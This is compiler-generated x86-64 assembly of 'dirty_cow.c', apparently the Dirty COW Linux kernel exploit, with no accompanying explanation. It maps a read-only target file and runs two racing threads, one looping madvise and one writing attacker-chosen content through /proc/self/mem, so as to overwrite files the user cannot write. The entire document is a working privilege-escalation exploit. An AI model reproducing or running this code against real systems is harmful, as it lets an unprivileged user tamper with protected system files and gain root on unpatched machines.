	.file	"dirty_cow.c"
	.text
	.globl	map
	.bss
	.align 8
	.type	map, @object
	.size	map, 8
map:
	.zero	8
	.globl	f
	.align 4
	.type	f, @object
	.size	f, 4
f:
	.zero	4
	.globl	st
	.align 32
	.type	st, @object
	.size	st, 144
st:
	.zero	144
	.globl	name
	.align 8
	.type	name, @object
	.size	name, 8
name:
	.zero	8
	.section	.rodata
.LC0:
	.string	"madvise %d\n\n"
	.text
	.globl	madviseThread
	.type	madviseThread, @function
madviseThread:
.LFB0:
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$32, %rsp
	movq	%rdi, -24(%rbp)
	movq	-24(%rbp), %rax
	movq	%rax, -16(%rbp)
	movl	$0, -8(%rbp)
	movl	$0, -4(%rbp)
	jmp	.L2
.L3:
	movq	map(%rip), %rax
	movl	$4, %edx
	movl	$100, %esi
	movq	%rax, %rdi
	call	madvise@PLT
	addl	%eax, -8(%rbp)
	addl	$1, -4(%rbp)
.L2:
	cmpl	$99999999, -4(%rbp)
	jle	.L3
	movl	-8(%rbp), %eax
	movl	%eax, %esi
	leaq	.LC0(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	nop
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE0:
	.size	madviseThread, .-madviseThread
	.section	.rodata
.LC1:
	.string	"/proc/self/mem"
.LC2:
	.string	"procselfmem %d\n\n"
	.text
	.globl	procselfmemThread
	.type	procselfmemThread, @function
procselfmemThread:
.LFB1:
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$48, %rsp
	movq	%rdi, -40(%rbp)
	movq	-40(%rbp), %rax
	movq	%rax, -16(%rbp)
	movl	$2, %esi
	leaq	.LC1(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	open@PLT
	movl	%eax, -20(%rbp)
	movl	$0, -8(%rbp)
	movl	$0, -4(%rbp)
	jmp	.L5
.L6:
	movq	map(%rip), %rax
	movq	%rax, %rcx
	movl	-20(%rbp), %eax
	movl	$0, %edx
	movq	%rcx, %rsi
	movl	%eax, %edi
	call	lseek@PLT
	movq	-16(%rbp), %rax
	movq	%rax, %rdi
	call	strlen@PLT
	movq	%rax, %rdx
	movq	-16(%rbp), %rcx
	movl	-20(%rbp), %eax
	movq	%rcx, %rsi
	movl	%eax, %edi
	call	write@PLT
	movl	%eax, %edx
	movl	-8(%rbp), %eax
	addl	%edx, %eax
	movl	%eax, -8(%rbp)
	addl	$1, -4(%rbp)
.L5:
	cmpl	$99999999, -4(%rbp)
	jle	.L6
	movl	-8(%rbp), %eax
	movl	%eax, %esi
	leaq	.LC2(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	nop
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE1:
	.size	procselfmemThread, .-procselfmemThread
	.section	.rodata
	.align 8
.LC3:
	.string	"usage: dirtyc0w target_file new_content"
.LC4:
	.string	"%s\n"
.LC5:
	.string	"mmap %zx\n\n"
	.text
	.globl	main
	.type	main, @function
main:
.LFB2:
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$32, %rsp
	movl	%edi, -20(%rbp)
	movq	%rsi, -32(%rbp)
	cmpl	$2, -20(%rbp)
	jg	.L8
	movq	stderr(%rip), %rax
	leaq	.LC3(%rip), %rdx
	leaq	.LC4(%rip), %rcx
	movq	%rcx, %rsi
	movq	%rax, %rdi
	movl	$0, %eax
	call	fprintf@PLT
	movl	$1, %eax
	jmp	.L10
.L8:
	movq	-32(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	movl	$0, %esi
	movq	%rax, %rdi
	movl	$0, %eax
	call	open@PLT
	movl	%eax, f(%rip)
	movl	f(%rip), %eax
	leaq	st(%rip), %rdx
	movq	%rdx, %rsi
	movl	%eax, %edi
	call	fstat@PLT
	movq	-32(%rbp), %rax
	movq	8(%rax), %rax
	movq	%rax, name(%rip)
	movl	f(%rip), %edx
	movq	48+st(%rip), %rax
	movl	$0, %r9d
	movl	%edx, %r8d
	movl	$2, %ecx
	movl	$1, %edx
	movq	%rax, %rsi
	movl	$0, %edi
	call	mmap@PLT
	movq	%rax, map(%rip)
	movq	map(%rip), %rax
	movq	%rax, %rsi
	leaq	.LC5(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	movq	-32(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rdx
	leaq	-8(%rbp), %rax
	movq	%rdx, %rcx
	leaq	madviseThread(%rip), %rdx
	movl	$0, %esi
	movq	%rax, %rdi
	call	pthread_create@PLT
	movq	-32(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rdx
	leaq	-16(%rbp), %rax
	movq	%rdx, %rcx
	leaq	procselfmemThread(%rip), %rdx
	movl	$0, %esi
	movq	%rax, %rdi
	call	pthread_create@PLT
	movq	-8(%rbp), %rax
	movl	$0, %esi
	movq	%rax, %rdi
	call	pthread_join@PLT
	movq	-16(%rbp), %rax
	movl	$0, %esi
	movq	%rax, %rdi
	call	pthread_join@PLT
	movl	$0, %eax
.L10:
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE2:
	.size	main, .-main
	.ident	"GCC: (Debian 11.3.0-3) 11.3.0"
	.section	.note.GNU-stack,"",@progbits
